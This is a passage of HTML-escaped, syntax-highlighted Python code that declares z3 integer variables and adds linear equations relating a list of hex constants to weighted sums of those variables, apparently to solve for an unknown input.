&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v11&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v12&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v13&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v14&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v15&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v16&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v17&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v18&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v18&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v19&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v20&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v21&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v22&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v22&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v23&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;v24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;v24&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x295b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1050&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1c7a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x11f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xe4c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1827&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x31a4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x11bb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb2b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x116a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10a6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb81&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1012&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1514&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10c4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1089&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1d2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x119b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7af&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x874&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x13e7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x177b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xbe9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;z3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Solver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;77&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;76&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span 